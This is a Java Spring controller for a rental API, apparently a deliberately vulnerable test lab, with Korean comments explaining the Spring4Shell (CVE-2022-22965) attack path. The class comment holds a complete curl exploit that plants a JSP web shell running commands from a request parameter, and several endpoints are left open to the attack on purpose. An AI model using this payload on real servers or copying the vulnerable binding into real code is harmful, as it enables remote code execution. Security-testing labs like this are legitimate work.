package com.security.test.controller;

import com.security.test.model.dto.RentalDTO;
import com.security.test.service.RentalService;
import lombok.RequiredArgsConstructor;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

/**
 * ⚠️ VULNERABLE: Spring4Shell (CVE-2022-22965) 취약점 존재
 * @ModelAttribute를 사용하여 자동 데이터 바인딩 수행
 * class.module.classLoader 경로를 통한 RCE 가능
 *
 * 공격 명령어:
 * curl "http://localhost:8080/spring4shell-test-1.0/api/v1/rentals/start?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=rental&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
 */
@Controller
@RequiredArgsConstructor
public class RentalController {

    private final RentalService rentalService;

    @GetMapping("/rental")
    public String rentalPage() {
        return "forward:/rental.html";
    }

    /**
     * VULNERABLE: 렌탈 시작 엔드포인트 (간단한 POJO 사용)
     *
     * 이 엔드포인트는 의도적으로 취약하게 작성되었습니다.
     * @ModelAttribute는 Spring의 데이터 바인딩을 통해 자동으로 객체의 setter를 호출합니다.
     *
     * 공격 경로:
     * 1. class → getClass()
     * 2. class.module → getModule() (JDK 9+)
     * 3. class.module.classLoader → getClassLoader()
     * 4. class.module.classLoader.resources.context.parent.pipeline.first → Tomcat AccessLogValve
     *
     * 공격 성공 시 /opt/tomcat/webapps/ROOT/rental.jsp 생성됨
     */
    @GetMapping("/api/v1/rentals/start")
    public String rentalStartForm(@ModelAttribute RentalForm form, Model model) {
        model.addAttribute("form", form);
        return "rental-start";
    }

    /**
     * VULNERABLE: POST 요청 처리
     */
    @PostMapping("/api/v1/rentals/start")
    @ResponseBody
    @ResponseStatus(HttpStatus.CREATED)
    public RentalDTO.RentalResponse startRental(@ModelAttribute RentalForm form) {
        // 실제 서비스 로직은 여기서 처리
        RentalDTO.RentalStartRequest req = new RentalDTO.RentalStartRequest();
        req.setVehicleId(form.getVehicleId());
        req.setUserId(form.getUserId());
        req.setStartMeter(form.getStartMeter());
        return rentalService.start(req);
    }

    /**
     * 간단한 POJO 클래스
     *
     * Spring의 데이터 바인딩은 이 클래스의 setter를 자동으로 호출합니다.
     * 공격자는 'class' 속성을 통해 getClass() 메서드에 접근할 수 있습니다.
     */
    public static class RentalForm {
        private String vehicleId;
        private String userId;
        private String reservationId;
        private Integer startMeter;

        public String getVehicleId() {
            return vehicleId;
        }

        public void setVehicleId(String vehicleId) {
            this.vehicleId = vehicleId;
        }

        public String getUserId() {
            return userId;
        }

        public void setUserId(String userId) {
            this.userId = userId;
        }

        public String getReservationId() {
            return reservationId;
        }

        public void setReservationId(String reservationId) {
            this.reservationId = reservationId;
        }

        public Integer getStartMeter() {
            return startMeter;
        }

        public void setStartMeter(Integer startMeter) {
            this.startMeter = startMeter;
        }
    }

    /**
     * VULNERABLE: Form 기반 렌탈 생성 (application/x-www-form-urlencoded)
     * @ModelAttribute 사용 - Spring4Shell 공격 가능
     */
    @PostMapping(value = "/api/v1/rentals", consumes = "application/x-www-form-urlencoded")
    @ResponseBody
    @ResponseStatus(HttpStatus.CREATED)
    public RentalDTO.RentalResponse createRentalForm(@ModelAttribute RentalDTO.RentalStartRequest req) {
        return rentalService.start(req);
    }

    /**
     * VULNERABLE: GET 요청으로 렌탈 반납 폼
     * @ModelAttribute 사용 - Spring4Shell 공격 가능
     */
    @GetMapping("/api/v1/rentals/{rentalId}/return")
    public String rentalReturnForm(@PathVariable String rentalId,
                                    @ModelAttribute("return") RentalDTO.RentalReturnRequest req,
                                    Model model) {
        req.setRentalId(rentalId);
        model.addAttribute("return", req);
        return "rental-result";
    }

    /**
     * VULNERABLE: 렌탈 반납 처리
     * @ModelAttribute 사용 - Spring4Shell 공격 가능
     */
    @PatchMapping("/api/v1/rentals/{rentalId}")
    @ResponseBody
    public RentalDTO.RentalResponse finish(@PathVariable String rentalId,
                                           @ModelAttribute RentalDTO.RentalReturnRequest req) {
        req.setRentalId(rentalId);
        return rentalService.finish(rentalId, req);
    }
}